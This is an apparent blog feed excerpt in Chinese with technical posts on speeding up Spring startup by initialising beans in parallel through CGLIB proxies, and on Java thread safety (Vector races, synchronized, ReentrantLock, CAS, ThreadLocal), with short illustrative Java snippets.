<li><a href="#%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0">风险评估</a>
<ul>
<li><a href="#%E5%A6%82%E4%BD%95%E4%BF%9D%E8%AF%81%E4%BB%A3%E7%90%86%E5%AF%B9%E8%B1%A1%E7%9A%84%E8%A1%8C%E4%B8%BA%E5%92%8C%E5%8E%9F%E6%9C%89-bean-%E7%9A%84%E5%B1%9E%E6%80%A7-%E8%A1%8C%E4%B8%BA%E4%B8%80%E8%87%B4">如何保证代理对象的行为和原有 Bean 的属性、行为一致？</a></li>
<li><a href="#%E5%A6%82%E4%BD%95%E4%BF%9D%E8%AF%81%E4%BB%A3%E7%90%86%E5%AF%B9%E8%B1%A1%E6%96%B9%E6%B3%95%E6%89%A7%E8%A1%8C%E9%A1%BA%E5%BA%8F%E4%B8%8D%E4%BC%9A%E9%94%99%E4%B9%B1">如何保证代理对象方法执行顺序不会错乱？</a></li>
<li><a href="#%E5%85%B6%E4%BB%96%E5%8F%AF%E8%83%BD%E7%9A%84%E9%A3%8E%E9%99%A9%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3">其他可能的风险如何解决？</a></li>
</ul>
</li>
<li><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
</ul>
</p>
<h1 id="写在前面">写在前面</h1>
<p>Spring 官网自豪地对自家产品评价到：快速、简单、安全。「快速」被其列为了第一位，可见这是 Spring 最引以为傲的特性。<br>
<img src="https://yao177.github.io/post-images/1646029531559.jpeg" alt="Spring 官网介绍" loading="lazy"><br>
「快速」意味着快速开发、快速启动、快速运行……而对于「快速启动」这一点，开发人员也许还有可乘之机。</p>
<h1 id="项目背景">项目背景</h1>
<p>服务部署虽然通常给开发人员提供了宝贵的休息时间，但服务启动时间过长，也势必会影响开发效率，增大回滚时的风险。<br>
Spring Bean 初始化耗时占 Spring 启动时间的70%，若能优化 Spring Bean 的初始化时间，则会达到提高服务启动速度的目的。<br>
concurrent-spring-startup 是一个旨在让 Spring 通过并行化来提高启动速度的项目，无代码侵入，绿色健康可食用。</p>
<h1 id="知识背景">知识背景</h1>
<h2 id="spring">Spring</h2>
<h3 id="spring-简述">Spring 简述</h3>
<p>Spring 框架可以被理解为一个容器，它帮我们管理了应用程序所需要的所有 Bean。<br>
例如：我们会在项目里的很多地方用到同一个数据库连接池，我们只需要将它声明为一个 Spring Bean。Spring 启动时，会将这个 bean 创建并小心翼翼地保护好。在任何我们需要的时候，向它索取即可。<br>
Spring 的启动过程涉及非常多的逻辑。本文围绕 Bean 的生命周期来对这一过程做介绍。Spring 的启动可以简单理解为下面三部曲：<br>
创建 Spring 容器 -&gt; 扫描所有 Bean 定义 -&gt; 创建所有 Bean<br>
<img src="https://yao177.github.io/post-images/1646036988133.svg" alt="Spring 简易启动流程" loading="lazy"></p>
<h3 id="spring-关键组件">Spring 关键组件</h3>
<h4 id="beanfactory">BeanFactory</h4>
<p>即 Spring 用来管理 Bean 的容器，用户可以按照名称、类型等信息来获取指定的 Bean。<br>
在这个接口的不同实现中，Spring 管理了不同类型Bean的生命周期（实例化、初始化、销毁）。它容纳了 Spring 中各个Bean的实例、Bean 的定义（来自 XML 或代码）。<br>
它是 Spring 框架的核心接口。<br>
其本身只包含获取 Bean 的方法，而其具体实现类有一些重要方法：</p>
<ul>
<li><code>getBean (String beanName)</code><br>
从Spring 容器中获取指定名称的Bean实例。若还没有创建，则创建之。事实上，Spring 正是通过这个方法来创建 Bean 的。</li>
<li><code>populateBean (String beanName, RootBeanDefinition mbd, BeanWrapper bw)</code><br>
用于 Bean 的实例化。getBean 被执行时，Spring 会调用 populateBean 进行 bean 的创建。参数 mbd 即 bean 的属性定义，例如我们在 XML 里面设置的字段和值。若 bean 依赖了其它 bean，它还会触发其它 bean 的创建和注入。</li>
</ul>
<h4 id="applicationcontext">ApplicationContext</h4>
<p>BeanFactory 接口的子类，拓展了很多功能供开发者使用，例如手动注入 bean、获取 bean、获取 bean的指定属性等。<br>
它内部持有另一个 BeanFactory 的引用，并全权负责这个 BeanFactory 的生命周期（实例化、初始化、销毁）。因此它对 BeanFactory 接口的实现都是基于这个内部BeanFactory的。也就是说，ApplicationContext 是专门给外部使用的（Springboot、开发者），而它所提供的花里胡哨的功能具体实现是由内部的 beanFactory 去完成的。<br>
事实上 ApplicationContext 其实不用实现BeanFactory接口，它已经提供了<code>getAutowireCapableBeanFactory</code>方法来获得“真正的 BeanFactory”。也许是为了不让开发者在两个接口中来回切换，只关注一个 Spring 组件，于是一并把 BeanFactory 接口实现了。明白这一点可以让读者理解 ApplicationContext 和 BeanFactory 的关系。<br>
在它的实现类中，有一些重要的方法：</p>
<ul>
<li><code>refresh()</code><br>
大名鼎鼎的refresh方法即为Spring容器启动的入口。该方法会完整地创建自己持有的BeanFactory，并执行它的初始化动作（例如扫描Bean定义、实例化所有Bean、初始化所有Bean、添加各类处理器和监听器）。如果已经存在一个初始化完毕的BeanFactory，那就先销毁它，“推翻重来”。</li>
<li><code>loadBeanDefinitions(DefaultListableBeanFactory factory)</code><br>
在refresh方法里执行。ApplicationContext 会扫描所有定义 Bean 的地方（XML、注解、Groovy 等），并将其放置到内部持有的这个 factory 里面（通常是一个 Map&lt;String, BeanDefinition&gt;）。</li>
</ul>
<h4 id="beanpostprocessor">BeanPostProcessor</h4>
<p>Bean初始化前后的「钩子」。它有两个方法：</p>
<ul>
<li><code>postProcessBeforeInitialization(Object bean, String beanName)</code><br>
在具体的Bean初始化前被 Spring 容器调用，并对 Bean 进行一系列操作。例如 <code>ApplicationContextAwareProcessor</code> 的该方法会根据 bean 的类型，为各个 Spring 基础组件设置默认的属性。</li>
<li><code>postProcessAfterInitialization(Object bean, String beanName)</code><br>
在具体的 Bean 初始化完成后被 Spring 容器调用，允许对 Bean 进行一系列后置的操作。<br>
注意，Spring 容器将会把这两个方法返回值作为新的 Bean 来替代原有的 Bean。本项目正是利用了这个特性来完成 Bean 的“偷天换日”。</li>
</ul>
<h4 id="instantiationawarebeanpostprocessor">InstantiationAwareBeanPostProcessor</h4>
<p>BeanPostProcessor 的子类。它新增了方法：</p>
<ul>
<li><code>postProcessPropertyValues(PropertyValues pvs, PropertyDescriptor[] pds, Object bean, String beanName)</code><br>
该方法会在 bean 属性组装时调用。这里的属性（pvs）来自于用户在 XML 中或代码里指定的 Bean 的字段或属性。事实上，Spring 正是利用它来完成了依赖注入，例如它的实现之一——<code>AutowiredAnnotationBeanPostProcessor</code> 会在这个方法里将 bean 中被 @Autowired 和 @Value 标记的字段注入具体的值或者对象。</li>
</ul>
<h3 id="spring-容器启动过程">Spring 容器启动过程</h3>
<p>有了上文的基础，Spring 容器的启动流程可以进一步描述为：<br>
<img src="https://yao177.github.io/post-images/1646040974089.svg" alt="Spring 启动流程" loading="lazy"></p>
<h3 id="spring-与本项目的联系">Spring 与本项目的联系</h3>
<ul>
<li>本项目利用 Spring 的<code>BeanPostProcessor</code>来将原有 Bean 替换为自定义动态代理对象</li>
<li>利用<code>ApplicationListener</code>来保证 Spring 启动完成前所有的异步方法执行完成</li>
</ul>
<h2 id="cglib">CGLIB</h2>
<h3 id="cglib-简述">CGLIB 简述</h3>
<p>CGLIB 是一个运行时的字节码生成工具。<br>
在平时，字节码文件都是编译时创建的。而 CGLIB 可以在运行时创建字节码，故称作“动态”代理。<br>
CGLIB 可以用来为某个类创建一个子类，并在其方法（非全部）被调用时进行拦截，执行自己的逻辑。<br>
在 Spring 的 AOP 场景中，CGLIB 被大量使用。</p>
<h3 id="cglib-的使用示例">CGLIB 的使用示例</h3>
<pre><code class="language-Java">public class CglibTest {
    public void print() {
        System.out.println(&quot;CglibTest#print be invoked&quot;);
    }

    public static void main(String[] args) {
        Enhancer enhancer = new Enhancer(); //CGLIB的工具类
        enhancer.setSuperclass(CglibTest.class); //需要设置一个父类
        enhancer.setCallback(new MethodInterceptor() { //方法拦截器，o为代理对象，method为被调用的方法，objects为方法参数，methodProxy为代理方法，通常用于执行父类（原类）方法
            @Override
            public Object intercept(Object o, Method method, Object[] objects, MethodProxy methodProxy) throws Throwable {
                System.out.println(&quot;CglibTestProxy#print be invoked&quot;);
                methodProxy.invokeSuper(o, objects); //执行父类方法
                return null;
            }
        });
        CglibTest cglibTest = (CglibTest) enhancer.create(); //创建代理对象
        cglibTest.print(); //执行方法
    }
}
</code></pre>
<p>输出结果</p>
<pre><code class="language-Shell">CglibTestProxy#print invoked
CglibTest#print invoked
</code></pre>
<p>运行示意图：<br>
<img src="https://yao177.github.io/post-images/1646041699356.svg" alt="cglib 代理流程" loading="lazy"></p>
<h3 id="cglib-和-jdk-动态代理的区别">CGLIB 和 JDK 动态代理的区别</h3>
<ul>
<li>使用区别：CGLIB 支持直接代理现成的类；JDK 只支持接口代理，应用场景被大打折扣。</li>
<li>效率区别：CGLIB 比 JDK 动态代理快出不止一个数量级。原因是拦截器入参中的 MethodProxy 里面会直接用原父类的引用进行方法调用，而非通过 Method 对象反射调用。<br>
读者可以简单理解为<code>super.print()</code>远比<code>super.class.getMethod(&quot;print&quot;).invoke()</code>快很多。这块实现较为复杂，由于篇幅限制，可以通过 <a href="https://zhuanlan.zhihu.com/p/106069224">CGLIB 动态代理的使用和分析</a> 简单了解。</li>
</ul>
<h3 id="注意事项">注意事项</h3>
<p>由于 CGLIB 本质是实现一个子类，因此它不能代理 final 修饰的类；<br>
由于 private、final 方法不能被继承，因此它的拦截器无法获取 private、final 修饰的方法；<br>
不要在<code>MethodProxy</code>中直接调用 invoke，这会导致循环调用，重复进入拦截器。应当只调用其<code>invokeSuper</code>方法。</p>
<h3 id="cglib-与本项目的联系">CGLIB 与本项目的联系</h3>
<p>利用 CGLIB 实现原有 Bean 的动态代理，配置自定义的方法策略。</p>
<h1 id="设计思路">设计思路</h1>
<p>由知识背景知，一个原生的 Spring 启动流程已在上文中举出。<br>
由项目背景得知，这个过程中耗时最长的是 Bean 的初始化。RPC 客户端与服务端建立连接、各个中间件连接池的创建等都在各自的 Bean 初始化中完成。这中间不乏复杂的计算逻辑和耗时的 IO 操作。倘若我们将 Bean 的初始化改成异步执行，那将实现 bean 的并行初始化，加快启动速度。</p>
<h2 id="提出目前的问题和对应解决方案">提出目前的问题和对应解决方案：</h2>
<ol>
<li>Bean 本身的初始化方法都是同步的，如何实现异步？——使用 CGLIB 代理，当执行初始化方法时放入线程池异步执行；</li>
<li>如何让 Spring 的 Bean 替换成我们的动态代理对象？——实现<code>BeanPostProcessor#postProcessBeforeInitialization</code>方法来在bean初始化前进行替换；</li>
<li>如何让保证 Bean 在被其他组件使用时，不会出现 Bean 未初始化完成的情况？——让 Bean 其他方法执行时同步等待其初始化完成；</li>
<li>如何保证 Spring 启动后，所有的 Bean 都初始化完成？——实现<code>ApplicationListener</code>来等待 Spring 启动完成通知，等待所有 Bean 初始化完成。<br>
至此，我们已经形成了解决思路，下节介绍项目具体实现。</li>
</ol>
<h1 id="原理介绍">原理介绍</h1>
<h2 id="项目概览">项目概览</h2>
<figure data-type="image" tabindex="1"><img src="https://yao177.github.io/post-images/1646048369211.svg" alt="优化启动流程" loading="lazy"></figure>
<h2 id="创建代理流程">创建代理流程</h2>
<figure data-type="image" tabindex="2"><img src="https://yao177.github.io/post-images/1646049504592.svg" alt="创建代理流程" loading="lazy"></figure>
<h2 id="前置校验">前置校验</h2>
<p>前置校验分为两部分，一是 Bean 的类能否创建 CGLIB 代理，二是该 Bean 的初始化方法能否被 CGLIB 代理。</p>
<h3 id="如何获取-bean-的初始化方法">如何获取 Bean 的初始化方法</h3>
<p>Spring Bean 有三种初始化方法（按执行顺序）：</p>
<ol>
<li><code>@PostConstruct</code>注解标记的方法<br>
获得方式：通过扫描类的方法注解可以过滤出。</li>
<li><code>InitializingBean</code>的<code>afterPropertiesSet</code>方法<br>
获得方式：直接反射获得之。</li>
<li>XML 中指定的<code>init-method</code>方法<br>
获得方式：反射获取该 Bean 的 <code>AbstractBeanDefinition</code> 的 <code>initMethodName</code> 字段。</li>
</ol>
<h3 id="校验类型">校验类型</h3>
<ol>
<li>该类能否被 CGLIB 代理
<ul>
<li>有无参构造函数</li>
<li>该类必须被声明为非 final 的</li>
<li>该类不能是 JDK 代理类或者 CGLIB 代理类</li>
</ul>
</li>
<li>该 Bean 的初始化方法能否被 CGLIB 代理
<ul>
<li>该方法必须被声明为非 final 的</li>
<li>该方法必须为非 static 或 private 的</li>
</ul>
</li>
</ol>
<h2 id="装配代理方法策略">装配代理方法策略</h2>
<blockquote>
<p>什么是代理方法策略：<br>
在代理对象被外部调用时，代理方法策略能将原有方法路由到不同的代理方法，以此确定方法的真正执行过程。</p>
</blockquote>
<p>在项目中，该策略实体是一个<code>ConcurrentHashMap</code>，key值为Method，value为WrappedMethod。<br>
<em>注：下表中original bean表示代理类持有的原bean的引用，method表示该方法策略被命中时，代理类被外部调用的方法</em></p>
<table>
<thead>
<tr>
<th>Bean 原有方法</th>
<th>代理策略</th>
<th>执行流程</th>
<th>附加说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>初始化方法</td>
<td>AsyncMethod</td>
<td>等待其依赖的 AsyncMethod 执行完毕后，在线程池中注册异步任务，对 original bean 执行 method。</td>
<td>该策略是项目能加速的原因。<br>其通过持有一个依赖的 AsyncMethod 引用，来保证初始化方法执行顺序是不变的。</td>
</tr>
<tr>
<td>Object.class的方法<br><code>FactoryBean#getObjectType</code></td>
<td>SyncMethod</td>
<td>直接令original bean执行method。</td>
<td>FactoryBean#getObjectType 的注释中明确说明，若方法返回 null 则表明该 bean 还未被初始化，因此提前调用是不违背 Spring 规范的。通过直接调用它来预测 FactoryBean#getObject 的返回类型，创建代理对象。</td>
</tr>
<tr>
<td>FactoryBean#getObject</td>
<td>ObjectProxyMethod</td>
<td>返回一个动态代理对象，该对象在被实际调用方法时必须等待其 FactoryBean 代理对象的所有 AsyncMethod 完成。</td>
<td>FactoryBean 初始化完成后，会调用 getObject，将返回值注入到 Spring 容器中。因此我们通过返回代理对象，在对象实际被调用的时候再等待 FactoryBean 初始化完成，来实现一个“懒加载”，增加并发度。</td>
</tr>
<tr>
<td>WrappedProxyBean#getOriginalBean<br>WrappedProxyBean#setOriginalBean</td>
<td>OriginalBeanGetterMethod<br>OriginalBeanSetterMethod</td>
<td>返回/设置该代理对象持有的original bean</td>
<td>这个组件内的所有代理对象都将实现 WrappedProxyBean 接口，用于返回/设置该代理对象持有的 original bean。</td>
</tr>
<tr>
<td>其余方法</td>
<td>DefaultMethod</td>
<td>等待该代理类的所有 AsyncMethod 完成时，执行 method。</td>
<td>其他方法调用时，必须等待所有 AsyncMethod 执行完成，以保证执行顺序不改变。</td>
</tr>
</tbody>
</table>
<p>下图是代理对象被执行时，代理方法策略的匹配过程。<br>
<img src="https://yao177.github.io/post-images/1646106362899.svg" alt="代理方法策略匹配流程" loading="lazy"></p>
<h2 id="对-factorybean-的特殊处理">对 FactoryBean 的特殊处理</h2>
<p>FactoryBean有两个重要方法：<code>getObject</code>、<code>getObjectType</code>。顾名思义，FactoryBean 是用来创建 Bean 的，因此在 FactoryBean 本身被创建后，Spring 会调用其 getObject 方法来获得一个新的 Bean，并注入到 Spring 容器中完成其整个生命周期。而 getObjectType 用于 FactoryBean 声明它所生产的 Bean 的类型。<br>
若我们不对 getObject 方法做处理，则在其被调用时，将会阻塞 Spring 线程。如图：<br>
<img src="https://yao177.github.io/post-images/1646106611326.svg" alt="阻塞spring流程" loading="lazy"><br>
如果我们令 FactoryBean 返回一个动态代理对象，并令动态代理对象被实际调用方法时，再等待 FactoryBean 初始化完成，则：<br>
<img src="https://yao177.github.io/post-images/1646106809424.svg" alt="不阻塞spring流程" loading="lazy"><br>
可以看到，对 getObject 的调用并没有阻塞 Spring 主线程，从而提高了启动速度。</p>
<h2 id="创建代理对象">创建代理对象</h2>
<ol>
<li>将 bean 的类型作为父类，将装配了代理方法策略的 MethodInterceptor 作为拦截器，利用 CGLIB 的 Enhancer 生成代理对象；</li>
<li>将该 Enhancer 实例存入缓存中，供之后相同类型的 Bean 直接使用，以此跳过前置校验和方法装配阶段；</li>
<li>将代理对象返回给 Spring 容器。</li>
</ol>
<h2 id="场景示例">场景示例</h2>
<p>假设有如下两个 Bean：</p>
<pre><code class="language-Java">@Bean
public class RpcClient implements FactoryBean, InitializingBean {
    RpcClient() {
    }
    public void afterPropertiesSet() {
        // do some socket work
    }
    public Object getObject() {
        return new RpcService();
    }
    public Class getObjectType() {
        return RpcService.class;
    }
    // other method
}
</code></pre>
<pre><code class="language-Java">@Bean
public Manger {
  @Resource
  RpcService rpcService;
  
  public String getName(int id) {
    return rpcService.getName(int id);
}
</code></pre>
<pre><code class="language-Java">public interface RpcService {
  String getName(int id);
}
</code></pre>
<p>当 Spring 启动时，本项目做以下事情：</p>
<ul>
<li>异步执行 RpcClient 的初始化方法，并返回 rpcClientProxy 给 Spring 容器；</li>
<li>Spring 执行 rpcClientProxy 的 getObject 方法，得到 rpcServiceProxy；</li>
<li>解决 Manger 依赖时，将 rpcServiceProxy 注入到 rpcService 字段；</li>
<li>当项目启动结束前，本项目将会等待 rpcClientProxy 的异步方法执行完毕。<br>
当<code>Manger#getName</code>被调用时：<br>
<img src="https://yao177.github.io/post-images/1646112526954.svg" alt="Manger#getName" loading="lazy"></li>
</ul>
<p>当 Spring 启动完成前，本项目会等待所有的异步方法执行完毕。因此当用户请求打入时，并不存在等待的过程。</p>
<h1 id="风险评估">风险评估</h1>
<p>本项目人为修改了部分 Spring 加载 Bean 的流程，因此不可避免地需要进行一些风险评估。</p>
<h2 id="如何保证代理对象的行为和原有-bean-的属性-行为一致">如何保证代理对象的行为和原有 Bean 的属性、行为一致？</h2>
<p>代理对象没有修改原有 Bean 的方法逻辑，它持有一个原有 bean 的引用，任何方法调用最终都会调用原有 bean 方法，因此属性和行为是没有变动的。</p>
<h2 id="如何保证代理对象方法执行顺序不会错乱">如何保证代理对象方法执行顺序不会错乱？</h2>
<p>本项目通过为所有的异步方法指定执行顺序，来保证它们不会并发执行；而对于其他方法，除能直接执行的方法 (Object.class 的方法、getObjectType 方法) 外，其余均需要等待初始化完成，保证了 Bean 相关代码的执行顺序。</p>
<h2 id="其他可能的风险如何解决">其他可能的风险如何解决？</h2>
<p>在初始化方法中操作 BeanFactory 可能导致项目死锁，无法启动。<br>
任何通过 BeanFactory 获取或操作 Bean 的行为都会被 Spring 并发控制。具体实现是通过 synchronized 获取 singletonObjects（<code>ConcurrentHashMap&lt;String, Object&gt;</code>，存放所有单例 Bean 的容器）的对象锁来避免同时操作单例 Bean 容器。<br>
由于 BeanPostprocessor 处于 Bean 加载的上下文中，因此总是持有 singletonObjects 的对象锁；若 Bean 在初始化方法中利用 beanFactory 操作其他 Bean ，则会导致如下情况：<br>
<img src="https://yao177.github.io/post-images/1646113568033.svg" alt="对象锁" loading="lazy"><br>
因此本项目通过死锁超时检测，当主线程序阻塞一定时间后（例如20s），抛出导致死锁的类名，用户可以在注解中通过 exclude 指定不为该类创建动态代理。</p>
<h1 id="总结">总结</h1>
<p>至此，项目已介绍完成，想随便聊聊。<br>
本质上，这个项目就是利用了懒加载特性，先有个壳，再加载真正的 Bean 实体；其实这个思想在算法中也很常见，例如二分思想的经典算法——线段树，利用 lazy propagation (惰性传播) 在父节点打上修改的标记而不直接修改，只有真正访问到时才往子节点进行传递，提升了效率。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Java 进阶｜线程安全]]></title>
        <id>https://yao177.github.io/post/java-synchronized/</id>
        <link href="https://yao177.github.io/post/java-synchronized/">
        </link>
        <updated>2021-04-01T03:27:31.000Z</updated>
        <content type="html"><![CDATA[<h1 id="线程安全">线程安全</h1>
<h2 id="定义">定义</h2>
<p>线程安全并没有统一的定义，这里使用《Java Concurrency In Practice》书中的定义：</p>
<blockquote>
<p>当多个线程访问一个对象时，如果不用考虑这些线程在运行时环境下的调度和交替执行，也不需要进行额外的同步，或者在调用方进行任何其他的协调操作，调用这个对象的行为都可以获得正确的结果，那这个对象是线程安全的。</p>
</blockquote>
<h2 id="线程安全程度">线程安全程度</h2>
<p>上面的定义非常严谨，它要求线程安全的代码满足：代码本身封装了所有必要的同步手段，令调用者无须关心多线程的问题，更不需要自己采取措施来保证在多线程环境下的正确调用。</p>
<p>保证这一点非常难，因此我们常常会另一个角度来理解线程安全，即线程安全程度。</p>
<p>《深入理解java虚拟机》中将 Java 语言各种共享操作共享的数据可以分为以下5类：<strong>不可变、绝对线程安全、相对线程安全、线程兼容和线程对立</strong>。</p>
<h3 id="不可变">不可变</h3>
<p>不可变（Immutable）的对象一定是线程安全的，无论是对象方法的实现还是方法的调用者，都不需要在采取任何的线程安全保障措施。</p>
<ul>
<li>如果数据是基本类型，那么定义时使用 final 关键字即可</li>
<li>如果数据是对象类型，那就需要保证对象的行为不会对其状态产生任何影响（如 String 类，调用其<code>substring()</code>、<code>replace()</code>等方法不会影响原来的值，只会返回一个新构造的字符串对象）。</li>
</ul>
<p>保证对象的行为不会对其状态产生任何影响最简单的方法就是把对象中带有状态的变量声明为 final，这样在构造函数结束之后，它就是不可变的，如 Integer。</p>
<pre><code class="language-Java">    /**
     * The value of the {@code Integer}.
     *
     * @serial
     */
    private final int value;

    /**
     * Constructs a newly allocated {@code Integer} object that
     * represents the specified {@code int} value.
     *
     * @param   value   the value to be represented by the
     *                  {@code Integer} object.
     */
    public Integer(int value) {
        this.value = value;
    }
</code></pre>
<h3 id="绝对线程安全">绝对线程安全</h3>
<p>不管运行时环境如何，调用者都不需要任何额外的同步措施。</p>
<p>要达到绝对线程安全通常付出很大代价，甚至不切实际的代价。</p>
<p>以 Vector 为例，它是一个线程安全的容器，因为其内部的操作方法都用了 synchronized 关键字作为同步措施，但是即使它所有的方法都被修饰成同步，也不意味着调用它的时候永远不需要同步手段了。请看下面的 demo：</p>
<pre><code class="language-Java">    private static Vector&lt;Integer&gt; vector = new Vector&lt;&gt;();

    public static void main(String[] args) {
        while (true) {
            for (int i = 0; i &lt; 10; i++) {
                vector.add(i);
            }
            Thread removeThread = new Thread(() -&gt; {
                for (int i = 0; i &lt; vector.size(); i++) {
                    vector.remove(i);
                }
            });
            Thread printThread = new Thread(() -&gt; {
                for (int i = 0; i &lt; vector.size(); i++) {
                    System.out.println(vector.get(i));
                }
            });
            removeThread.start();
            printThread.start();
            //避免过多线程
            while (Thread.activeCount() &gt; 10) ;
        }
    }
</code></pre>
<p>输出结果如下：<br>
<img src="https://yao177.github.io/post-images/1646211347456.png" alt="" loading="lazy"></p>
<p>虽然 Vector 的 add()、remove()、get() 方法都是同步的，但并不能保证调用就是绝对线程安全的。假设打印线程在打印序号为i的元素前，线程被系统调度挂起，切换为删除线程，而这个删除线程刚好把序号为i的元素删除了，系统再切换打印线程运行时，这个序号为i的元素已经被删除，再调用 get(i) 访问时就会得到 ArrayIndexOutOfBoundsException。要保证代码是绝对线程安全的，必须在调用方加一些同步措施：</p>
<pre><code class="language-Java">  Thread removeThread = new Thread(() -&gt; {
    synchronized (vector) {
      for (int i = 0; i &lt; vector.size(); i++) {
        vector.remove(i);
      }
    }
  });
  Thread printThread = new Thread(() -&gt; {
    synchronized (vector) {
      for (int i = 0; i &lt; vector.size(); i++) {
        System.out.println(vector.get(i));
      }
    }
  });
</code></pre>
<h3 id="相对线程安全">相对线程安全</h3>
<p>这是通常意义的线程安全，它要求对该对象的单独操作是线程安全的，但是对于特定顺序的连续调用，需要在调用端使用额外的同步手段保证调用的正确性。</p>
<p>上面的代码就是相对线程安全的案例，在 Java 中大部分线程安全类属于相对线程安全类型，如 Vector、Hashtable 等。</p>
<h3 id="线程兼容">线程兼容</h3>
<p>对象本身就不是线程安全的，但是可以通过通过同步手段保证调用端在并发环境下的线程安全。如 ArrayList、HashMap 等。</p>
<h3 id="线程对立">线程对立</h3>
<p>无论调用端是否采取同步措施，都无法并发使用。这种类型很少出现，应当尽量避免。</p>
<p>例如 Thread 类的 suspend()、resume()，这两个方法的功能是中断线程和恢复线程（这两个 API 已被 JDK废弃）。</p>
<blockquote>
<p>被废弃是因为 suspend() 在导致线程暂停的同时，并不会去释放任何锁资源。其他线程都无法访问被它占用的锁。直到对应的线程执行 resume() 方法后，被挂起的线程才能继续，从而其它被阻塞在这个锁的线程才可以继续执行。<br>
但是，如果 resume() 操作出现在 suspend() 之前执行，那么线程将一直处于挂起状态，同时一直占用锁，这就产生了死锁。</p>
</blockquote>
<h1 id="线程安全的实现">线程安全的实现</h1>
<p>线程安全的实现可以分为三类：<strong>阻塞（互斥）同步、非阻塞同步和可重入代码</strong>。</p>
<h2 id="阻塞同步">阻塞同步</h2>
<p>互斥同步是常见的一种保障并发正确性的手段。Java 中常用的互斥同步手段就是 synchronized 关键字和 ReentrantLock 类。</p>
<ul>
<li>同步是指多个线程并发访问共享数据时，保证其数据在同一个时刻只被一个（或者一些，使用信号量的时候）线程使用</li>
<li>互斥是实现同步的一种手段</li>
</ul>
<h3 id="synchronized">synchronized</h3>
<p>synchronized 关键字是 Java 原生语法层面的互斥锁。synchronized 关键字经过编译后，会在同步块的前后插入 monitorenter 和 monitorexit 这两个字节码指令，这两个字节码都需要一个 reference 类型参数来指定要加锁和解锁的对象</p>
<h3 id="reentrantlock">ReentrantLock</h3>
<p>跟 synchronized 一样，ReentrantLock 也具有可重入性，但在代码写法上表现为 Java API 层面的互斥锁（lock() 和 unlock()方法配合 try/finally 语句来完成）。</p>
<h3 id="对比">对比</h3>
<p>与 synchronized 相比，ReentrantLock 拥有一些高级功能：</p>
<ul>
<li>等待可中断：当持有锁的线程长期不释放锁的时候，正在等待的线程可以选择放弃等待，改为处理其他事情，这对执行时间很长的同步块很有帮助。</li>
<li>公平锁：多个线程在等待同一个锁时，必须按照申请锁的时间顺序来依次获得锁（synchronized 中的锁是非公平的）。</li>
<li>锁可以绑定多个条件：一个 ReentrantLock 对象同时可以绑定多个 Condition 对象。</li>
</ul>
<p>从性能上看，synchronized 和 ReentrantLock 之间并没有明显的差异，如果不是需要使用 ReentrantLock 中的高级功能的情况下，一般情况都推荐直接使用 synchronized 关键字。</p>
<h2 id="非阻塞同步">非阻塞同步</h2>
<p>互斥同步的最主要的问题就是进行线程阻塞和唤醒带来的性能问题，因此这种同步被称为阻塞同步。</p>
<p>从处理方式上说，互斥同步是一种悲观的并发策略，无论资源是否真的被竞争，都一定要做正确的同步措施。</p>
<p>而非阻塞同步是一种基于冲突检测的乐观并发策略，简单来讲是先进行操作，如果没有其他线程争用共享数据，那操作就成功了；如果共享数据有争用，产生了冲突，那就采取其他的补偿措施（最简单的就是不断重试，直到成功为止）。</p>
<h3 id="乐观并发策略">乐观并发策略</h3>
<p>乐观并发策略的实现依赖于硬件指令，因为必须要从硬件层面保证冲突检测和操作这两个步骤具有原子性，如果从软件层面保证就会变成互斥同步，没有意义。</p>
<p>常见的这类指令有：</p>
<ul>
<li>测试并设置（Test-and-Set）</li>
<li>获取并增加（Fetch-and-Increment）</li>
<li>交换（Swap）</li>
<li>比较并交换（Compare-and-Swap）</li>
<li>加载链接/条件存储（Load-Linked/Store-Conditional）</li>
</ul>
<p>Java中可以使用 CAS 操作，该操作由 sun.misc.Unsafe 类里面的 compareAndSwapInt() 和 compareAndSwapLong() 等几个方法包装提供，上层有 Atomic 原子包工具类方便使用。</p>
<h3 id="cas">CAS</h3>
<p>CAS 操作的“ABA”问题，如果一个变量初始值是A，线程1读到变量值是A，这时候另一个线程2也从也读取到变量值为A，并且线程2进行了一些操作将变量值修改为B，然后线程2又将变量值修改为A，这时候线程1进行CAS操作发现变量的值仍是A，然后线程1操作成功。尽管线程1的CAS操作成功，但是不代表这个过程就是没有问题的，如果链表的头在变化了两次后恢复了原值，但是不代表链表就没有变化。</p>
<p>J.U.C 包提供了带有标记的原子类 AtomicStampedReference 来解决 CAS 的 ABA 问题，做法是通过控制变量值的版本来保证 CAS 的正确性。</p>
<h2 id="无同步方案">无同步方案</h2>
<p>同步时只是保证共享数据争用时的正确性的手段，但是如果方法不涉及共享数据，那它自然不需要任何同步手段去保证正确性，下面是两类无同步的方案。</p>
<h3 id="可重入代码">可重入代码</h3>
<p>可重入代码也叫纯代码（Pure Code），其在运行过程中可以被打断，并由开始处再次执行，并且在合理的范围内（多次重入，而不出现错误），程序可以在被打断处继续执行，且执行结果不受影响。可重入性的特点如下：</p>
<ul>
<li>不依赖公用的系统资源和数据</li>
<li>用到的状态都由参数传入</li>
<li>不调用非可重入的方法</li>
<li>输出完全由输入决定，只要输入相同的数据，都能返回相同的结果（类似于幂等性）</li>
</ul>
<h3 id="线程本地存储">线程本地存储</h3>
<p>共享数据的可见范围在同一个线程之内，那么无需同步也能保证同一线程内不出现共享数据争用的问题。</p>
<p>Java 中通过 ThreadLocal 类实现线程本地存储的功能。</p>
<h4 id="threadlocal">ThreadLocal</h4>
<p>每个 Thread 对象中有一个 ThreadLocalMap 对象，存储的是以 ThreadLocal.threadLocalHashCode 属性值为 Key 值，以本地线程变量为值的 K-V对。</p>
<p>每一个 ThreadLocal 对象的 threadLocalHashCode 值是唯一计算出来的，ThreadLocal 类中有一个原子整数类型（AtomicInteger）的静态变量 nextHashCode 来维护 threadLocalHashCode 值，每次计算 threadLocalHashCode 值通过调用 AtomicInteger.getAndAdd() 方法添加一个固定偏移量得到，这里通过 CAS 操作保证唯一性。</p>
<h1 id="参考资料">参考资料</h1>
<ul>
<li>《Java Concurrency In Practice》</li>
<li>《深入理解java虚拟机》</li>
</ul>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Java 进阶｜Java 内存模型]]></title>
        <id>https://yao177.github.io/post/java-volatile/</id>
        <link href="https://yao177.github.io/post/java-volatile/">
        </link>
        <updated>2021-03-31T03:24:50.000Z</updated>
